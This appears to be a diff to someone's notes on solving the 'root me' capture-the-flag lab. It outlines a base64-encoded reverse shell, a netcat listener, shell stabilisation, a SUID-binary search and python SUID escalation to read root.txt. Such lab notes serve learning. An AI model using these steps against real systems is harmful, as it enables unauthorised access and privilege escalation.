@@ -1,5 +1,9 @@
 # root me
 
+- cyberchef
+- revshell
+- gtfobins
+
 ## task 1 deploy the machine
 - deploy the machine
 - ip = 10.10.1.253
@@ -29,7 +33,9 @@
     - open cyberchef
     - open revshell
         - and which nc mkfifo
-        - and go cyberchef and copy to base 64
+        - and go cyberchef
+        - setting ip and port reverse
+        - and copy to base 64
         - after copy 
         - add echo base64
         - add in base64 and | base64 -d > shell.sh
@@ -39,16 +45,40 @@
         - chmod +x shell.sh
         - chmod 777 shell.sh
     - and listen
-        - 
+        - nc -lvnp 9001 (copy in revshell)
+    - run
+        - whoami
+            - which python
+            - python3 -V
+        - python3 -c "import pty; pty.spawn('/bin/bash')" => untuk nampilin lokasi file
+        - export TERM=xterm
+            - ls /home
+            - cd /home
+            - ls -la
+            - cd rootme
+            - ls -la
+        - user.txt
+            - cd /var/www
+            - ls -la
+            - cat user.txt
     - user.txt
+- 
 
 ## Task 4  Privilege escalation
 - Search for files with SUID permission, which file is weird?
-    -
+    - ctrl z
+    - stty raw -echo;fg;
+        - reset
+    - find / -perm /4000 2>dev/null
+        - /usr/bin/python
+    - open gtfobins
+        - find python SUID and copy python
 - Find a form to escalate your privileges.
     -
 - root.txt
-    -
+    - cd /root
+        - ls -la
+        - cat root.txt
 
 # hands on lab
 - nmap -sC -sV 10.10.1.253 => untuk melihat 
